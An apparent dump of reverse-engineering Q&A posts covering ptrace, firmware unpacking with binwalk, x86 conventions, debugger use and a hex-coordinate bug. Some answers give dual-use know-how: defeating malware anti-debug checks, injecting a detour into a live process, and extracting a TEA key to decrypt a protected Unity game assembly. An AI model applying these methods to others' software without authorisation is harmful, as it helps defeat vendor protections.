    int thread_area_base;
    int start_address_offset = 0x234;
    void* start_address;

    int ret = attach(tid);
    if(ret == -1) return -1;

    gs = get_gs_register(tid);
    if(gs == -1){
        detach(tid);
        return -2;
    }

    thread_area_base = get_thread_area_base(tid, gs);
    if(thread_area_base == -1){
        detach(tid);
        return -3;
    }
    printf(""thread_area_base: %p\n"", (void*) thread_area_base);
    unsigned int start_address_pointer = thread_area_base + start_address_offset;
    printf(""start_address_pointer: %p\n"", (void*) start_address_pointer);

    start_address = get_start_address(tid, start_address_pointer);
    printf(""start_address: %p\n"", start_address);

    detach(tid);
    return 0;
}

int attach(int tid){
    int status; 
    int ret = ptrace(PTRACE_ATTACH, tid, NULL, NULL);
    if(ret == -1){
        print_error(""PTRACE_ATTACH"", errno);
    }

    ret = waitpid(-1, &amp;status, __WALL);
    if(ret == -1){
        print_error(""waitpid()"", errno);
    }
    return ret;
}   

int detach(int tid){
    int ret = ptrace(PTRACE_DETACH, tid, NULL, NULL);
    if(ret == -1){
        print_error(""PTRACE_DETACH"", errno);
    }
    return ret;
}

void print_error(char* func_name, int errnumber){
    printf(""%s failed. %i, %s\n"", func_name, errnumber, strerror(errnumber));
}
</code></pre>
","4046"
"Trying to reverse GPS Watch firmware image with binwalk","1568","","<p>I'm in the process of trying to reverse engineer a GPS-watch firmware image in purpose of adding a new feature to the watch. Here's what I got so far</p>

<ul>
<li>I have the firmware image (.gcd file). AFAIK it's no common image, I couldn't find <em>any</em> information about it from googling</li>
</ul>

<p>Here's the <code>binwalk</code> output:</p>

<pre><code>DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
344446        0x5417E         Zlib compressed data, default compression
548342        0x85DF6         Zlib compressed data, default compression
548698        0x85F5A         Zlib compressed data, default compression
548849        0x85FF1         Zlib compressed data, compressed
549789        0x8639D         Zlib compressed data, compressed
550677        0x86715         Zlib compressed data, compressed
550878        0x867DE         Zlib compressed data, default compression
551849        0x86BA9         Zlib compressed data, default compression
551871        0x86BBF         Zlib compressed data, best compression
552002        0x86C42         Zlib compressed data, default compression
552145        0x86CD1         Zlib compressed data, compressed
552274        0x86D52         Zlib compressed data, default compression
552425        0x86DE9         Zlib compressed data, compressed
552778        0x86F4A         Zlib compressed data, default compression
553056        0x87060         Zlib compressed data, default compression
553199        0x870EF         Zlib compressed data, compressed
554875        0x8777B         Zlib compressed data, compressed
555202        0x878C2         Zlib compressed data, default compression
555341        0x8794D         Zlib compressed data, compressed
555600        0x87A50         Zlib compressed data, default compression
555778        0x87B02         Zlib compressed data, default compression
555928        0x87B98         Zlib compressed data, default compression
556221        0x87CBD         Zlib compressed data, compressed
556502        0x87DD6         Zlib compressed data, default compression
556612        0x87E44         Zlib compressed data, default compression
556953        0x87F99         Zlib compressed data, compressed
559176        0x88848         Zlib compressed data, default compression
559922        0x88B32         Zlib compressed data, default compression
560116        0x88BF4         Zlib compressed data, default compression
560292        0x88CA4         Zlib compressed data, default compression
560417        0x88D21         Zlib compressed data, compressed
560774        0x88E86         Zlib compressed data, default compression
561567        0x8919F         Zlib compressed data, default compression
562207        0x8941F         Zlib compressed data, best compression
670601        0xA3B89         Zlib compressed data, best compression
673859        0xA4843         Zlib compressed data, compressed
678389        0xA59F5         Zlib compressed data, default compression
797326        0xC2A8E         Zlib compressed data, default compression
811248        0xC60F0         Zlib compressed data, compressed
850955        0xCFC0B         Zlib compressed data, best compression
1023917       0xF9FAD         Zlib compressed data, best compression
1079306       0x10780A        Zlib compressed data, default compression
1278786       0x138342        Zlib compressed data, default compression
1278986       0x13840A        Zlib compressed data, default compression
1279066       0x13845A        Zlib compressed data, default compression
1279106       0x138482        Zlib compressed data, default compression
1279186       0x1384D2        Zlib compressed data, default compression
1279226       0x1384FA        Zlib compressed data, default compression
1281321       0x138D29        Copyright string: "" 2002-2009n""
1284386       0x139922        XML document, version: ""1.0""
1294150       0x13BF46        LZMA compressed data, properties: 0x64, dictionary size: 16777216 bytes, uncompressed size: 754974720 bytes
1294166       0x13BF56        LZMA compressed data, properties: 0x64, dictionary size: 16777216 bytes, uncompressed size: 419430400 bytes
1294182       0x13BF66        LZMA compressed data, properties: 0x64, dictionary size: 16777216 bytes, uncompressed size: 419430400 bytes
1294206       0x13BF7E        LZMA compressed data, properties: 0x64, dictionary size: 16777216 bytes, uncompressed size: 419430400 bytes
1294222       0x13BF8E        LZMA compressed data, properties: 0x64, dictionary size: 16777216 bytes, uncompressed size: 419430400 bytes
1370193       0x14E851        Zlib compressed data, default compression
</code></pre>

<p>It all seems like a false positive because when I run 
<code>binwalk -e</code> I get these files as output:</p>

<p><img src=""https://i.stack.imgur.com/jrxCN.png"" alt=""enter image description here""></p>

<p>All files without file suffixes are empty and the zip files give an error. ( I can't unzip the zlib files)</p>

<p>From <code>hexdump</code> output I see quite a lot of ascii which I guess indicates it's not encrypted. Especially I've found that there seems to be some sort of language files between <code>0x10780A</code> and <code>0x138342</code></p>

<p>I've included the hexdump as hex2.out</p>

<p><a href=""https://www.dropbox.com/sh/60fl2temsvbf29i/AAAAX1-vz-M-LWhnGs5aAsvCa?dl=0"" rel=""nofollow noreferrer"">All the files can be found here</a></p>

<p><strong>My question is:</strong> Where do I go from here? Please help, I've no idea.</p>
","<p>The Garmin GCD file format is documented <a href=""http://www.gpspassion.com/forumsen/topic.asp?TOPIC_ID=115804#777367"" rel=""nofollow noreferrer"">here</a>, with some additional information <a href=""http://www.gpspassion.com/forumsen/topic.asp?TOPIC_ID=115804#777367"" rel=""nofollow noreferrer"">here</a> and <a href=""http://www.gpspassion.com/forumsen/topic.asp?TOPIC_ID=117239"" rel=""nofollow noreferrer"">here</a>.</p>

<p>Furthermore, it looks like somebody already wrote a <a href=""http://www.gpspassion.com/forumsen/topic.asp?TOPIC_ID=137838"" rel=""nofollow noreferrer"">tool</a> (mirrored <a href=""http://garminmontanagpsr.wikispaces.com/file/view/RGN_Tool.exe/333010964/RGN_Tool.exe"" rel=""nofollow noreferrer"">here</a>) for handling and manipulating Garmin GCD files:</p>

<p><img src=""https://i.stack.imgur.com/StceH.png"" alt=""enter image description here""></p>
","6868"
"What does %reg:value mean in ATT assembly?","1562","","<p>When I disassemble a function, I encounter from time to time an expression of the form <code>%reg:value</code>. Typically, I encounter this syntax when I activate the canaries in GCC (<code>-fstack-protector</code>), as in the following example:</p>

<pre><code>(gdb) disas
Dump of assembler code for function foo:
   0x000000000040057c &lt;+0&gt;: push   %rbp
   0x000000000040057d &lt;+1&gt;: mov    %rsp,%rbp
   0x0000000000400580 &lt;+4&gt;: sub    $0x20,%rsp
   0x0000000000400584 &lt;+8&gt;: mov    %edi,-0x14(%rbp)
=&gt; 0x0000000000400587 &lt;+11&gt;:    mov    %fs:0x28,%rax
   0x0000000000400590 &lt;+20&gt;:    mov    %rax,-0x8(%rbp)
   0x0000000000400594 &lt;+24&gt;:    xor    %eax,%eax
   0x0000000000400596 &lt;+26&gt;:    mov    $0x4006ac,%edi
   0x000000000040059b &lt;+31&gt;:    callq  0x400440 &lt;puts@plt&gt;
   0x00000000004005a0 &lt;+36&gt;:    mov    -0x8(%rbp),%rax
   0x00000000004005a4 &lt;+40&gt;:    xor    %fs:0x28,%rax
   0x00000000004005ad &lt;+49&gt;:    je     0x4005b4 &lt;foo+56&gt;
   0x00000000004005af &lt;+51&gt;:    callq  0x400450 &lt;__stack_chk_fail@plt&gt;
   0x00000000004005b4 &lt;+56&gt;:    leaveq 
   0x00000000004005b5 &lt;+57&gt;:    retq   
</code></pre>

<p>What is the meaning of this kind of syntax?</p>
","<p><code>%fs:028h</code> is actually using the form <code>segment:offset</code>, which means it is reaching the memory address at offset <code>28h</code> in the segment selected by the Far Segment <code>FS</code>.</p>

<p>Any memory reference has an implicit segment (most of the time, <code>CS</code> for execution, <code>DS</code> for data read/write), which can be overriden by a segment prefix.</p>
","1991"
"What x86 calling convention passes first parameter via ESI?","1561","","<p>I am looking at some x86 code, which I believe was built using a Microsoft tool chain, and am trying to figure out the calling convention used during this call:</p>

<pre><code>   push esi ; save ESI (it gets restored later)
   lea esi, [ebp-0xC] ; set param 1 for call to FOO
   call FOO
   test eax, eax ; test return value
   jz somelabel
</code></pre>

<p>The function FOO starts like this:</p>

<pre><code>   FOO:
   mov edi, edi
   push ebx
   xor ebx, ebx
   push ebx ; null
   push esi ; pass ESI in as second param to upcoming call, which has been set by caller
   push ptr blah
   mov [esi+0x8], ebx
   mov [esi+0x4], ebx
   mov [esi], ebx
   call InterlockedCompareExchange ; known stdcall func which takes 3 params
   test eax, eax
   ...
</code></pre>

<p>as ESI is not initialized in the body of FOO, I have assumed it is passed in as a param by the caller.</p>

<p>What is this calling convention? It looks to be a variant of fastcall. Is there a name for this convention?</p>
","<p>There is no ""official"" calling convention that works like that. What you're seeing is most likely the result of <a href=""http://msdn.microsoft.com/en-us/magazine/cc301698.aspx"">Link-time Code Generation</a>, also known as LTO (Link-time optimization) or WPO (<a href=""http://msdn.microsoft.com/en-us//library/0zza0de8.aspx"">Whole program optimization</a>).</p>

<p>When it is enabled, the optimization and code generation is done at link time, when the compiler has access to the code of whole program and all compile units, and can use this information for the more extreme optimizations.</p>

<p>From <a href=""http://msdn.microsoft.com/en-us/library/xbf3tbeh.aspx"">MSDN</a>:</p>

<blockquote>
  <p>When /LTCG is used to link modules compiled by using /Og, /O1, /O2, or
  /Ox, the following optimizations are performed: </p>
  
  <ul>
  <li><p>Cross-module inlining</p></li>
  <li><p>Interprocedural register allocation (64-bit operating systems only)</p></li>
  <li><p><strong>Custom calling convention</strong> (x86 only)</p></li>
  <li><p>Small TLS displacement (x86 only)</p></li>
  <li><p>Stack double alignment (x86 only)</p></li>
  <li><p>Improved memory disambiguation (better interference information for global variables and input parameters)</p></li>
  </ul>
</blockquote>

<p>In the code snippet you quoted the compiler detected that the function <code>FOO</code> is not called from outside of the program, so it could customize the calling convention to something that uses register values already set up at the place of call, or otherwise improve register allocation. With heavily templated code you can even get several copies of often-used functions that accept arguments in different sets of registers and/or stack.</p>
","2674"
"How to handle exceptions in a debugger when reversing malware?","1556","","<p>I came across some malware that raised an exception while I was single stepping through it. IDA gives me the option to pass the exception to the application or not. What exactly is going on here? When would I not want to pass the exception to the application?</p>
","<p>Often times malware and/or obfuscated code (such as unpacking stubs) will do something such as the following:</p>

<ol>
<li>Set up an exception handler.</li>
<li>Throw an exception.</li>
<li>See if the exception handler caught the exception.</li>
</ol>

<p>If the exception handler didn't catch the exception then the debugged code knows that a debugger was attached and ""swallowed"" the exception, thus indicating that the code is being debugged. In order to hide your debugger from such detection techniques, you always want to pass exceptions to the application when dealing with malware and/or obfuscated code.</p>
","2239"
"How to find WndProc using x64dbg?","1554","","<p>I'm trying to find a WndProc from explorer.exe that is handling these messages, I've found with Spy++:</p>

<pre><code>&lt;000001&gt; 00000000000B01C8 P message:0xC02B [Registered:""SHELLHOOK""] wParam:00000025 lParam:000F0184
&lt;000002&gt; 00000000000B01C8 P message:0xC02B [Registered:""SHELLHOOK""] wParam:00008006 lParam:000F0184
</code></pre>

<p>I'm trying to prevent explorer.exe from flashing the task bar button, it's ruining my Windows 10 experience. In Windows 10 the flashing task bar buttons appear in all desktops, and it's just maddening when focusing on a work on another virtual desktop. Not a feature I want. The above messages are sent to Task switcher in explorer.exe, if I can prevent them being handled I can beat this.</p>

<p>I've wealth of knowledge about the WndProc which I want to see, and modify from Spy++, following windows are Property Inspector of Spy++ (64 bit version):</p>

<p>(Note: the 32bit version of Spy++ does not show Window Proc at all, just <code>(Unavailable)(Unicode)</code></p>

<p><a href=""https://i.stack.imgur.com/k5L8n.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/k5L8n.png"" alt=""Window Proc address?""></a></p>

<p><a href=""https://i.stack.imgur.com/OiDsN.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/OiDsN.png"" alt=""Thread ID""></a></p>

<p>And in x64dbg I have the thread open:</p>

<p><a href=""https://i.stack.imgur.com/DZN8w.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/DZN8w.png"" alt=""x64dbg open on the same thread""></a></p>

<p>But I just can't figure out how can I find the Window Proc in x64dbg?</p>
","<p>the spy++ is showing the wndproc in your screen shot (it is probably subclassed you may need to trace but wndproc is shown in your screenshot as <code>361c9880</code>  i dont know what the command is in x64 dbg but if you were on ollydbg you simply do ctrl+g (goto) keyin the address as shown in spy++ and break and log the messages for filtering</p>

<p>a screen shot of calc.exe -> backspace button windows wndproc in comctl32.dll  (32 bits and 64 bits shouldn't matter much on concept level)
<a href=""https://i.stack.imgur.com/Q2tMg.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Q2tMg.png"" alt=""enter image description here""></a></p>

<p>an entry by raymond chen talks about cokies being returned instead of wndproc<br>
<a href=""http://blogs.msdn.com/b/oldnewthing/archive/2003/12/01/55900.aspx"" rel=""nofollow noreferrer"">http://blogs.msdn.com/b/oldnewthing/archive/2003/12/01/55900.aspx</a></p>

<p>if all else fails assemble GetWindowLongPtrW in place to fetch the actual WndProc</p>

<pre><code>suspend the process (f12 or esc)   
use ctrl+g to goto user32.GetWindowLongPtrW     
right click set new origin here   (save the rip prior this)   
save the state of register somewhere    
modify rcx and plop the handle into rcx   
(which was b01c8 in your screen shot)   
use the latest window handle as shown by spy++     
for the existing session do not put 0xb01c8  
modify edx to hold -4 (index of GWLP_WNDPROC)    
step through the Function     
before the function returns rax should hold the actual WndProc   
save or set a bp on the Wndproc   
restore registers and rip to pristine state and continue exploring   
</code></pre>

<p>downloaded x64dbg and ran 64 bit calc.exe spy++ 32 bit doesn't show wndproc 
cooked a script to alloc a page in process memory of calc.exe and assembled 
a detour using the script language and fetched the actual WndProc </p>

<p>a screen shot below</p>

<p><a href=""https://i.stack.imgur.com/7Jy6A.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/7Jy6A.png"" alt=""enter image description here""></a></p>

<p>the debuggee must be in paused state </p>

<p>the script allocates memory in debuggees address space using alloc<br>
after tabbing once  the status bar should show the newly allocated address<br>
also variables $lastalloc $result  should hold the newly allocated memory address<br>
if you do d address a bunch of 00 00 should stare at you </p>

<p>confirm the allocation<br>
if the memory is allocated tab one step in the script<br>
push rcx should be assembled in the newly allocated address<br>
use d address or d $lastalloc to confirm<br>
like wise assemble all the instruction 
use the proper handle value in ecx (stale or reused window handles may provide incorrect information confirm you assemble mov rcx , HWND right<br>
now you need to ensure you put the right address in eax  the address should be of user32.GetWindowLongPtrW 
assemble all the cleanup instructions 
one you have done this 
save the existing rip some where (write it down in a paper)
right click and select the first instruction in the newly allocated address and set it as origin ( new origin here) the rip will be changed to the newly allocated address </p>

<p>hit f8 and execute the instructions on by one 
when call eax is done eax will hold the Wndproc 
save this (write it in paper )</p>

<p>execute the cleanup instruction </p>

<p>hit ctrl+g and enter the old RIP 
right click -> new origin here ( RIP will now point to the old value when you paused the debuggee</p>

<p>that is it now you have Wndproc in a paper and you have returnd to the original state </p>

<p>this  is a detour (making an intentional bypass in the code flow of debuggee to do some extra work and return back to the place where bypass was done as if nothing was done to continue the original flow)</p>

<p>use bp to set a breakpoint in the wndproc you have on paper</p>
","11211"
"Rebuild symbol table","1548","","<p>I would like to load a function I have decompiled in IDA Pro.  All I have is the IDA Pro function name <code>sub_xxxx()</code> and obviously the address.  I had thought about using <code>dlopen</code> to load the binary but obviously I don't have a symbol to load as the binary has been stripped.  Could I somehow call the function without a symbol table?  Or do I have to rebuild the symbol table of the binary to then use <code>dlsym</code> to locate and load the symbol?</p>
","<p>You can call a function at any address. So, load the dynamic library into your process address space, figure out the base of the newly loaded library and take the offset from the base of the library of the function you wan't to call and add that together. </p>

<p>So if IDA says the base of the binary is <code>0x4000</code> and your function is at address <code>0x4100</code>, then you have an offset of <code>0x100</code>. Then if you load your library it winds up getting loaded at address <code>0x8000</code>, you make a function pointer (with the correct signature of course) pointing at address <code>0x8000 + 0x100</code> and call it. Depending on your platform the base you get for your dynamic library from the platform loader may be further offset from the actual base IDA shows.</p>

<p>Another option is of course to add a new export definition for your <code>sub_xxx()</code> function to the dynamic library and having the loader actually handle any relocations. It will be far more reliable, will allow you to name the function something sane so that you can handle future updates to the library where the function address changes simply by re-adding your new export to the new version. Use something like <a href=""http://www.zynamics.com/bindiff.html"" rel=""nofollow"">BinDiff</a> to find the new location of the function.</p>

<p>The third popular option is to use something similar to <a href=""https://www.hex-rays.com/products/ida/tech/flirt/in_depth.shtml"" rel=""nofollow"">IDAs FLIRT</a> signatures in order to scan the loaded dynamic library for the function directly in memory. It's generally called signature scanning and <a href=""https://wiki.alliedmods.net/Signature_Scanning"" rel=""nofollow"">here's a more thorough explanation</a> of the concept on the Windows platform. Very simplified it's a technique for finding a function based off of pattern extracted from the function prologue.</p>

<p>In your case you control the application from what I can see and want to call into a dynamic library you don't have the source for. In that case I would probably go with the second option or the first one if you know that the library will never change.</p>
","4550"
"What is __alloca_probe_16 and what does it do?","1542","","<p>I'm reverse engineering some windows application. I came accross with this function that IDA recognized: </p>

<pre><code>call __alloca_probe_16
</code></pre>

<p>I'm unable to find any documentation/reference on this function except <a href=""http://microsoft.public.win32.programmer.kernel.narkive.com/i2VrpN4F/function-of-alloc-probe"" rel=""nofollow"" title=""here"">here</a>. The poster suggests that <code>__alloca_probe</code> is a support routine for the API <code>_alloca()</code> without providing any reference.</p>

<p>I'm just wondering if anyone knows what this function does and where I can find reference to undocumented/internal(?) APIs like this in the future. </p>
","<p>This funcion enures that an <code>alloca()</code> call returns  a pointer aligned to 16 bytes boundary. You can see the comments in <code>alloca16.asm</code> in Visual C++' CRT sources:</p>

<pre><code>; _alloca_probe_16, _alloca_probe_8 - align allocation to 16/8 byte boundary
;
;Purpose:
;       Adjust allocation size so the ESP returned from chkstk will be aligned
;       to 16/8 bit boundary. Call chkstk to do the real allocation.
;Entry:
;       EAX = size of local frame
;
;Exit:
;       Adjusted EAX.
;
;Uses:
;       EAX
</code></pre>

<p>NB: this comment seems to be stale; the current implementation tail-calls <code>_chkstk</code>, so the allocation (ESP adjustment) happens immediately.</p>
","10761"
"Ripping/pasting code into an executable using Olly","1534","","<p>I'm working with some x86 assembly code and I need to rip from one executable and paste that code into another.</p>

<p>Originally, I had an executable that was meant to accept two command line parameters and run a handwritten function on them. However, I ran into annoyances with using GetCommandLine et al to return the parameters in my ASM. Namely it returned Unicode and I needed the parameters in ANSI. Rather than dealing with setting up the library calls and converting that way I compiled a small program that uses command line arguments with the intent of reusing code.</p>

<p>So now I have two executables:
- one with the command line parameters parsed and in their proper places
- two with the actual assembled function code inside of it.</p>

<p>The first executable has the space for the function NOP'd out but I need a good way to paste the logic in. I've looked at Asm2clipboard, Code Ripper and data ripper but they only have the functionality to rip the assembly out, but not paste it back in.</p>

<p>I'm aware I'll have to fix addresses and things like that but I can't find a way in Olly or other tools to move the code between the executables. I can go into HexEdit or something like that I supposed but I was hoping there's an easier way.</p>
","<p>For OllyDbg, it is </p>

<ol>
<li><p>Select code from the CPU window </p></li>
<li><p>Right-click and choose <code>Binary</code></p></li>
<li><p>Choose <code>Binary Copy</code></p></li>
<li><p>In the target CPU window, do the same but select <code>Binary Paste</code></p></li>
</ol>
","1875"
"How do you set registers as structs within a function in IDA?","1525","","<p>For example, in the following disassembly:</p>

<pre><code>.text:007C6834 014                 mov     eax, [esi+4]
.text:007C6837 014                 mov     dword ptr [esi], offset ??_7CAvatar@@6B@ ; const CAvatar::`vftable'
</code></pre>

<p>How would I be able to set the type of the esi register to a struct, so that in an ideal world the disassembly would turn into:</p>

<pre><code>.text:007C6834 014                 mov     eax, [esi.field_04]
.text:007C6837 014                 mov     dword ptr [esi.vtable], offset ??_7CAvatar@@6B@ ; const CAvatar::`vftable'
</code></pre>
","<ol>
<li>Create a struct</li>
<li><p>Apply the struct in one the four ways:</p>

<ul>
<li>use the <kbd>T</kbd> hotkey.</li>
<li>Right-click the operand and choose the struct from ""Structure offset"" submenu.</li>
<li>menu Edit|Operand types|Offset|Offset (struct)</li>
<li>use the corresponding button on the Operand Type toolbar</li>
</ul></li>
</ol>

<p>Here's a short tutorial: <a href=""https://www.hex-rays.com/products/ida/support/tutorials/structs.shtml"">https://www.hex-rays.com/products/ida/support/tutorials/structs.shtml</a></p>
","2100"
"Weird binwalk output on GoPro Firmware","1517","","<p>I'm trying to extract GoPro hero 3+ camera firmware but I'm getting a weird output from <code>binwalk</code>.</p>

<p>This is the <code>binwalk</code> output (Uploaded to pastebin): </p>

<p><a href=""http://pastebin.com/raw.php?i=yVZFGZT6"" rel=""nofollow"">http://pastebin.com/raw.php?i=yVZFGZT6</a></p>

<p>As you can see there are a lot of lines including mcrypt, RSA and other lines but the firmware is not encrypted. Also checking the hexadecimal of the file I can see the following:</p>

<pre><code>000006f0  55 55 55 55 66 66 66 66  77 77 77 77 88 88 88 88  |UUUUffffwwww....|
</code></pre>

<p>As far as I know this is related to UBoot. And this other two lines showing some squashfs headers:</p>

<pre><code>0151d040  45 3d cd 28 88 4f 39 80  68 73 71 73 bc 4f 39 80  |E=.(.O9.hsqs.O9.|
02557250  8a f3 0d 00 68 73 71 73  90 f3 0d 00 72 65 65 62  |....hsqs....reeb|
</code></pre>

<p>Also, I can see some other lines related to CPIO but I can't figure out how to separate this file into extractable pieces.</p>

<p>The firmware image can be downloaded here: <a href=""http://software.gopro.com/Firmware/HD2/HD2-firmware.bin"" rel=""nofollow"">http://software.gopro.com/Firmware/HD2/HD2-firmware.bin</a></p>
","<p>Strings suggests this is using the UbiFS file system:</p>

<pre><code>$ strings HD2-firmware.bin | grep -i ubifs
console=tty0  lpj=2334720 ubi.mtd=lnx root=ubi0:linux rootfstype=ubifs
LNX_VIF=""../../../src/linuxinfo/ubifs.info""
CONFIG_BOSS_SECONDARY_CMDLINE=""console=tty0  lpj=2334720 ubi.mtd=lnx root=ubi0:linux rootfstype=ubifs""
console=tty0  lpj=2334720 ubi.mtd=lnx root=ubi0:linux rootfstype=ubifs
</code></pre>

<p>There are only two places where I see the UbiFS super magic bytes (0x24051905, see <a href=""http://www.cs.fsu.edu/~baker/devices/lxr/http/source/linux/fs/ubifs/ubifs.h"" rel=""nofollow"">http://www.cs.fsu.edu/~baker/devices/lxr/http/source/linux/fs/ubifs/ubifs.h</a>):</p>

<pre><code>$ binwalk -m ubifs.sig HD2-firmware.bin 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
23734456      0x16A28B8       UbiFS, little endian
23741868      0x16A45AC       UbiFS, little endian
</code></pre>

<p>For reference, the contents of ubifs.sig are:</p>

<pre><code>0   lelong  0x24051905      UbiFS, little endian
0   belong  0x24051905      UbiFS, big endian
</code></pre>

<p><strong>EDIT:</strong></p>

<p>The above seems to be a false positive. After creating a UbiFS image of my own, here's what it looks like in hex:</p>

<pre><code>00000000  31 18 10 06 dc 6a 3b 2d  4e 00 00 00 00 00 00 00  |1....j;-N.......|
00000010  00 10 00 00 06 00 00 00  00 00 00 00 00 00 00 00  |................|
00000020  00 02 00 00 00 00 02 00  0d 00 00 00 64 00 00 00  |............d...|
00000030  00 00 16 00 00 00 00 00  04 00 00 00 02 00 00 00  |................|
00000040  01 00 00 00 01 00 00 00  08 00 00 00 00 01 00 00  |................|
00000050  04 00 00 00 01 00 00 00  00 00 00 00 00 00 00 00  |................|
00000060  00 00 00 00 00 00 00 00  00 ca 9a 3b fb 7e 13 36  |...........;.~.6|
00000070  91 29 47 3b 8b dd 46 95  27 cc 8a 30 00 00 00 00  |.)G;..F.'..0....|
00000080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00001000  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
*
00020000  31 18 10 06 4a 3d 6b 5a  4f 00 00 00 00 00 00 00  |1...J=kZO.......|
00020010  00 02 00 00 07 00 00 00  45 00 00 00 00 00 00 00  |........E.......|
00020020  00 00 00 00 00 00 00 00  02 00 00 00 03 00 00 00  |................|
00020030  0c 00 00 00 d8 05 00 00  bc 00 00 00 0b 00 00 00  |................|
00020040  0c 00 00 00 00 08 00 00  98 06 00 00 00 00 00 00  |................|
00020050  00 26 05 00 00 00 00 00  38 03 00 00 00 00 00 00  |.&amp;......8.......|
00020060  30 d0 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |0...............|
00020070  00 24 00 00 00 00 00 00  07 00 00 00 2a 00 00 00  |.$..........*...|
00020080  07 00 00 00 00 02 00 00  07 00 00 00 36 00 00 00  |............6...|
00020090  00 00 00 00 00 00 00 00  0a 00 00 00 01 00 00 00  |................|
000200a0  01 00 00 00 0d 00 00 00  00 00 00 00 00 00 00 00  |................|
000200b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
00020200  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
</code></pre>

<p>Note the little endian magic number at the beginning of each node: <code>0x06101831</code>. </p>

<p>This pattern appears in the GoPro firmware, and it looks like the UbiFS image may start at <code>0x22C6100</code>; however, I was unable to mount either my UbiFS image (created with <code>mkfs.ubifs</code>) or the image from the GoPro firmware, so I cannot verify that this is true.</p>
","6575"
"Where can be assembly-csharp.dll decrypted?","1517","","<p>So I have an android game. Its <code>Assembly-CSharp.dll</code> causes <code>.NET Reflector</code> to show</p>

<blockquote>
  <p>File is not a portable executable. DOS header does not contain 'MZ'
  signature</p>
</blockquote>

<p>It's encrypted. The app seems to decrypt that assembly at app launch time.</p>

<p>So I used <code>UltraCompare</code> to point out what is changed from previous version(It wasn't encrypted).</p>

<p><code>classes.dex</code> was identical, so no java code was changed.<br />
<code>libmain.so</code> and <code>libunity.so</code> was identical, but <code>libmono.so</code> had a big change.</p>

<p>There was some new added symbols which seem to be related with encryption such as <code>TEAEncrypt</code>, <code>TEADecrypt</code>, <code>TEAEncryptString</code>, <code>TEADecryptString</code>, and some
mono library's C# internal call routine like <code>ves_icall_System_Security_SecureString_EncryptInternal</code>.</p>

<p>If it's the means of the encryption, I wander where are those functions called.</p>

<p>There was some changes to <code>Assembly-CSharp-firstpass.dll</code>, <code>Assembly-UnityScript.dll</code>, <code>Assembly-UnityStript-firstpass.dll</code> with <strong>a same change pattern</strong>. I can't figure out what does this means.</p>

<p>So where can be the <strong>Assembly-CSharp.dll</strong> decrypted at runtime?
Or is there another way without decrypting that at runtime?</p>
","<p>Mono is, basically, open source. So anyone can create a Mono implementation that, whenever it reads a chunk of a CIL DLL file, applies encryption to it. Maybe Unity delivers a libmono.so that does encryption with its newest version; maybe the vendor of the game implemented something themselves. You could start checking patch notes of Unity to learn if this is an official new feature; if not, it's likely that the game vendor created their own encrypting libmono.so.</p>

<p>Your TEA functions are, most likely, called within the libmono.so itself. If i had to implement something like that, i'd write wrapper functions <code>TEAopen</code>, <code>TEAread</code>, <code>TEAclose</code> for <code>fopen</code>, <code>fread</code>, <code>fclose</code> that decrypt on reading the file, then replace the <code>f-*</code> functions in the mono-code that reads a DLL with the <code>TEA-*</code> functions.</p>

<p>TEA encryption works with 8-byte chunks, which may be one of the reasons it was used here; if you want to read just a part of the file, you don't need to read everything before your part, except a few bytes to fill the 8-byte-block. But this also means the same 8 input bytes will always result in the same 8 output bytes, if your original DLL has areas with a lot of '\0' bytes, they will result in the same 8 bytes repeated over and over in the encrypted DLL.</p>

<p>While <a href=""http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.40.4708&amp;rep=rep1&amp;type=pdf"" rel=""nofollow"">TEA has a weakness that turns a 128 bit key into 126 effective bits, there seems to be no known plaintext attack on it</a>. This means, your observed same change pattern won't help you. So you need to extract the key from the mono implementation yourself. Disassemble that file, especially the <code>TEAEncrypt</code> and <code>TEADecrypt</code> functions. They should look somewhat like the code from the <a href=""https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm"" rel=""nofollow"">Wikipedia article</a>. Their second parameter is the key; either try to find out where that key is stored/generated, or do some dynamic analysis, put a breakpoint on those functions, and check what the parameter they get actually is. Also, check if it's really a standard TEA implementation, or maybe XTEA or a different key schedule constant or something. Once you have the key, find a program that takes a file and a TEA key and decrypts it, or roll your own; this shouldn't be too difficult as there are lots of open source TEA implementations in any language of your choice.</p>
","12736"
"Converting hex value to lat/long","1512","","<p>Sorry if this is the wrong place to ask this but I'm stumped. I'm looking at iOS code as follows. </p>

<pre><code>- (NSString *)currentE6Location {
    CLLocationCoordinate2D loc = [AppDelegate instance].mapView.centerCoordinate;
    return [NSString stringWithFormat:@""%08x,%08x"", (int)(loc.latitude*1E6), (int)(loc.longitude*1E6)];
}
</code></pre>

<p>So it's pretty simple.. From my understanding is they are taking a lat/lon and changing it from a float to an int then converting the int to a hex that is 0 padded in the front. So the hex value is 8 chars in length. The issue I'm having is do the same thing in python..</p>

<p>So the iOS app sends hex values like</p>

<pre><code>36.968772,-122.013498   ""0234194f,f8ba38ae""
</code></pre>

<p>The first set are lat/long and the 2nd are roughly their hex values</p>

<p>The lat works just fine</p>

<pre><code>0234194f = 36968783
</code></pre>

<p>So 
    36968783 / 1e6 = 36.968783 (like I said its a rough estimate between the two)</p>

<p>But the 2nd one is odd</p>

<pre><code>f8ba38ae = 4172953774
</code></pre>

<p>The seem to use a 4 there if it's a - value for lon since you can't have a negative int has a hex value. So dropping the 4</p>

<pre><code>172953774 / 1e6 = 172.953774 (so knowing the 4 is there it would be -172.953774)
</code></pre>

<p>So I'm a bit stumped on why it works fine for the lat but not the lon..</p>

<p>Again sorry if this is the wrong site for this.. please close if it is. </p>
","<p>I'm not sure that this is the right place -- StackOverflow would have been a fine place to ask -- but I'll answer anyway. Essentially the issue is that <code>%x</code> treats the argument as an unsigned int. So the value <code>f8ba38ae</code> is the two's complement representation of the original signed int.</p>

